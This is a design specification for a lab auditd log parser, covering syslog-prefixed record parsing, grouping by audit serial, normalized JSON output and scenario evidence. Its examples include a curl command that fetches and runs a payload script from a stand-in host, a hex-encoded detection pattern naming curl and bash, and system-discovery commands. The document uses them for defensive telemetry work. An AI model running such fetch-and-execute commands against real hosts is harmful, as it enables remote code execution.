# Auditd Parser Contract

## Purpose

This document defines the contract for parsing auditd telemetry collected from lab victim hosts. It is intended to bridge the current rsyslog-based collection path and future defender-side normalized telemetry used by investigation, evidence review, and coverage analysis.

The parser is not a detector. It does not mark attacks as detected, change `overall_result`, create rule candidates, or treat attacker-side structured events as defender telemetry.

## Scope

The initial parser contract covers auditd records collected from:

```text
/var/log/remote/<host>/auditd.log
```

The current lab rsyslog collection already creates host-scoped remote log files such as:

```text
/var/log/remote/ubuntu-victim01/auditd.log
```

The initial parser should focus on the lab-scoped audit keys introduced by the minimal auditd rules:

| Audit key | Intended normalized event type | Related artifacts | Scenario examples |
|---|---|---|---|
| `isl_execve` | `process_exec` | `process_exec`, `system_discovery` | `scenario_006`, `scenario_008` |
| `isl_tmp_marker` | `file_write` | `suspicious_file_write` | `scenario_007` |
| `isl_ssh_persistence` | `file_write` or `persistence_file_change` | `authorized_keys_modification` | `scenario_004` |

Other auditd records may exist in the same log file, but MVP parsing should prioritize records with audit keys that start with `isl_`.

## Non-Goals

The parser must not:

- Mark `detected=true`.
- Change `overall_result`.
- Auto-generate detection rules or rule-improvement candidates.
- Treat attacker-side `ATTACK_EVENT_JSON` or `attack_observed_effects.json` as auditd evidence.
- Collect command output.
- Commit raw audit logs or generated `data/` artifacts.
- Broaden collection scope beyond the existing lab auditd input.
- Depend on shell history as endpoint telemetry.

## Input Format

Remote auditd logs are syslog-prefixed audit records.

Example:

```text
2026-06-14T00:18:34+00:00 ubuntu-victim01 auditd type=SYSCALL msg=audit(1781396314.485:3389): arch=c000003e syscall=59 success=yes exit=0 a0=557115796290 a1=55711565c4e0 a2=5571157539d0 a3=8 items=2 ppid=34304 pid=35974 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=128 comm="grep" exe="/usr/bin/grep" subj=unconfined key="isl_execve"#035ARCH=x86_64 SYSCALL=execve AUID="victim01" UID="victim01"
```

The parser should split each line into:

| Field | Source |
|---|---|
| `collector_timestamp` | Syslog prefix timestamp |
| `host` | Syslog prefix hostname |
| `program` | Syslog prefix program, usually `auditd` |
| `record_type` | `type=...` |
| `audit_epoch` | `msg=audit(<epoch>:<serial>)` |
| `audit_serial` | `msg=audit(<epoch>:<serial>)` |
| `raw_message` | Full original line |

## Grouping Model

Auditd events are multi-record. The parser should group records by:

```text
host + audit_serial
```

The same logical event may include multiple record types:

```text
type=SYSCALL
type=EXECVE
type=CWD
type=PATH
type=PROCTITLE
```

The parser should merge all records with the same `host` and `audit_serial` into one normalized event.

## Wazuh Archive Source Boundary

The current parser contract remains for complete syslog-prefixed auditd records.
A bounded Scenario 009 Wazuh `archives.json` observation confirmed manager
receipt but retained only one serial-bearing `SYSCALL` document for each core
event. Additional transformed `journald` documents did not preserve an
extractable original audit serial.

Therefore the observed Wazuh archive is not equivalent to the current parser
input and must not be fed directly into the grouping model as if `EXECVE`, `CWD`,
`PATH`, and `PROCTITLE` records were present. Any future Wazuh-envelope adapter
must be a separate contract and cannot reconstruct record relationships that the
source did not preserve. The existing sanitized centralized-auditd fixture
remains canonical. See
[Scenario 009 Wazuh Raw Archive Validation Result](../scenarios/scenario009/wazuh_raw_archive_validation.md).

## Important Record Types

### SYSCALL

Use `SYSCALL` as the primary record for process, user, session, syscall, and audit key fields.

Common fields:

- `arch`
- `syscall`
- `success`
- `exit`
- `pid`
- `ppid`
- `auid`
- `uid`
- `gid`
- `euid`
- `tty`
- `ses`
- `comm`
- `exe`
- `key`

### EXECVE

Use `EXECVE` to reconstruct arguments.

Common fields:

- `argc`
- `a0`, `a1`, `a2`, ...

Arguments may appear as plain strings or hex-encoded strings depending on auditd output and rsyslog formatting. The parser should preserve the raw value and decode hex values when safe.

### CWD

Use `CWD` for working directory.

Common fields:

- `cwd`

### PATH

Use `PATH` to collect file paths associated with the event.

Common fields:

- `item`
- `name`
- `nametype`
- `mode`
- `ouid`
- `ogid`

For file-write events, the most relevant target path is usually the `PATH` record where `nametype=NORMAL`.

### PROCTITLE

Use `PROCTITLE` as a convenience command-line field.

Common fields:

- `proctitle`

The value may be truncated in some outputs. Do not rely on `PROCTITLE` alone when `EXECVE` records are available.

## Normalized Output

The MVP parser should produce a JSON array or object containing normalized auditd events.

Recommended output shape:

```json
{
  "source": "auditd",
  "host": "ubuntu-victim01",
  "audit_serial": "3070",
  "collector_timestamp": "2026-06-14T00:13:20+00:00",
  "audit_timestamp": "2026-06-14T00:13:20.639Z",
  "record_types": ["SYSCALL", "EXECVE", "CWD", "PATH", "PROCTITLE"],
  "audit_key": "isl_execve",
  "event_type": "process_exec",
  "syscall": "execve",
  "success": true,
  "pid": 35727,
  "ppid": 35726,
  "session": "135",
  "tty": "(none)",
  "auid": "victim01",
  "uid": "victim01",
  "gid": "victim01",
  "euid": "victim01",
  "comm": "bash",
  "exe": "/usr/bin/bash",
  "cwd": "/home/victim01",
  "argv": ["bash", "-c", "whoami && id && hostname && uname -a"],
  "proctitle": "bash -c whoami && id && hostname && uname -a",
  "paths": [],
  "raw_record_count": 5
}
```

For file-write events:

```json
{
  "source": "auditd",
  "host": "ubuntu-victim01",
  "audit_serial": "3257",
  "collector_timestamp": "2026-06-14T00:16:13+00:00",
  "audit_timestamp": "2026-06-14T00:16:13.008Z",
  "record_types": ["SYSCALL", "CWD", "PATH", "PROCTITLE"],
  "audit_key": "isl_tmp_marker",
  "event_type": "file_write",
  "syscall": "openat",
  "success": true,
  "pid": 35884,
  "ppid": 35883,
  "session": "137",
  "tty": "(none)",
  "auid": "victim01",
  "uid": "victim01",
  "gid": "victim01",
  "comm": "bash",
  "exe": "/usr/bin/bash",
  "cwd": "/home/victim01",
  "file_path": "/tmp/ai_soc_lab_scenario_007_marker.txt",
  "file_action": "write_create_truncate",
  "paths": [
    {
      "item": 1,
      "name": "/tmp/ai_soc_lab_scenario_007_marker.txt",
      "nametype": "NORMAL"
    }
  ],
  "raw_record_count": 5
}
```

## Event Type Mapping

Use audit keys and record contents to assign a coarse normalized `event_type`.

| Condition | Normalized `event_type` |
|---|---|
| `audit_key=isl_execve` and `syscall=execve` | `process_exec` |
| `audit_key=isl_tmp_marker` | `file_write` |
| `audit_key=isl_ssh_persistence` and path contains `.ssh` or `authorized_keys` | `persistence_file_change` |
| Known audit key but incomplete records | `audit_event` |
| Unknown audit key | `audit_event` |

The parser should avoid over-claiming. For example, a `process_exec` event containing `whoami` may support a `system_discovery` artifact during later correlation, but the parser itself should not assert the full scenario or ATT&CK technique unless a later enrichment layer owns that mapping.

## Field Normalization Rules

### User Fields

Auditd may include both numeric and interpreted user fields.

Examples:

```text
auid=1000
uid=1000
AUID="victim01"
UID="victim01"
```

Recommended behavior:

- Preserve numeric IDs where available.
- Prefer interpreted names for display fields when present.
- Keep both if possible, for example `auid_num=1000` and `auid="victim01"`.

### Timestamps

Use the syslog prefix as `collector_timestamp`.

Use `msg=audit(<epoch>:<serial>)` as `audit_timestamp` when conversion is implemented.

If conversion is not implemented in MVP, preserve the raw audit epoch string and still emit `collector_timestamp`.

### Hex-Encoded Arguments

Some `EXECVE` argument fields may be hex-encoded.

Example:

```text
a3=70726F637469746C653D2E2A286375726C7C63686D6F647C7061796C6F61645C2E73687C2F62696E2F626173687C62617368202D6329
```

Recommended behavior:

- Preserve raw argument values.
- Decode hex only when it is valid printable UTF-8.
- Add a parser note when decoding fails.
- Do not drop the event if decoding fails.

### Duplicate Records

Remote syslog collection may produce duplicate lines.

The parser should deduplicate records by at least:

```text
host + audit_serial + record_type + raw_message
```

Do not deduplicate separate records that share the same serial but have different record types.

### Noise Events

Validation commands such as `grep`, `ausearch`, `tail`, and `sudo auditctl` are also valid `execve` events and may appear with `key=isl_execve`.

The parser should not drop them by default. Instead:

- Emit normalized events faithfully.
- Optionally mark common validation commands with `is_validation_noise=true` in later enrichment.
- Let downstream smoke checks filter by time window, command, audit key, and scenario expectations.

## Scenario Support Examples

### Scenario 006: Process Execution

Expected relevant auditd evidence:

```text
key="isl_execve"
proctitle=curl -fsS -o /tmp/scenario_006_payload.sh http://192.0.2.40:8000/payload.sh
proctitle=chmod +x /tmp/scenario_006_payload.sh
proctitle=bash -c curl ... && chmod +x ... /tmp/scenario_006_payload...
```

Normalized events should support the `process_exec` artifact but should not mark the scenario as detected.

### Scenario 007: Suspicious File Write

Expected relevant auditd evidence:

```text
key="isl_tmp_marker"
name=/tmp/ai_soc_lab_scenario_007_marker.txt
syscall=openat
flags=O_WRONLY|O_CREAT|O_TRUNC
```

Additional process evidence may appear through `isl_execve`:

```text
key="isl_execve"
proctitle=bash -c printf ... > /tmp/ai_soc_lab_scenario_007_marker.txt
```

### Scenario 008: System Discovery

Expected relevant auditd evidence:

```text
key="isl_execve"
proctitle=bash -c whoami && id && hostname && uname -a
proctitle=whoami
proctitle=id
proctitle=hostname
proctitle=uname -a
```

## MVP Parser Behavior

The MVP parser should:

1. Read one or more remote auditd log files.
2. Extract syslog prefix fields.
3. Parse auditd `type=...` records.
4. Extract audit serial from `msg=audit(...)`.
5. Group records by `host + audit_serial`.
6. Merge supported record types into normalized events.
7. Filter or prioritize records where `audit_key` starts with `isl_`.
8. Emit normalized JSON.
9. Preserve enough raw fields for review and troubleshooting.
10. Avoid detection or rule-improvement decisions.

## Suggested CLI

Future implementation can use a CLI similar to:

```bash
uv run python agents/parser-agent/src/auditd_parser.py \
  --input /var/log/remote/ubuntu-victim01/auditd.log \
  --host ubuntu-victim01 \
  --output data/processed/auditd_events.json
```

For smoke validation:

```bash
uv run python agents/parser-agent/src/auditd_parser.py \
  --input /var/log/remote/ubuntu-victim01/auditd.log \
  --host ubuntu-victim01 \
  --audit-key-prefix isl_ \
  --output data/attacks/scenario_006_auditd_smoke/auditd_events.json
```

Generated outputs under `data/` should not be committed.

## Validation Expectations

MVP validation should include static or fixture-based tests for:

- Parsing syslog-prefixed auditd lines.
- Extracting `record_type`.
- Extracting `audit_serial`.
- Grouping multi-record events.
- Extracting `audit_key`.
- Reconstructing `argv` from `EXECVE`.
- Extracting `cwd`.
- Extracting `comm`, `exe`, `pid`, `ppid`, `auid`, `uid`.
- Extracting file paths from `PATH`.
- Handling hex-encoded argument values.
- Deduplicating repeated raw records.
- Preserving raw records or raw summaries for troubleshooting.

## Relationship To Existing Artifacts

The parser output can later be used by investigation or coverage logic to compare defender-side telemetry against attacker-side observed effects.

Important boundary:

```text
attack_observed_effects.json says what the attacker-side runner observed.
auditd_events.json says what defender-side auditd telemetry observed.
```

Both may describe the same lab action, but they are different evidence classes and should remain separate.

## Future Work

Candidate follow-on PRs:

1. `feat: add auditd parser MVP`
2. `test: add auditd parser fixtures`
3. `feat: attach auditd telemetry to investigation inputs`
4. `docs: map auditd normalized events to defender coverage matrix`
5. `feat: compare auditd evidence with observed effects in review-only alignment`
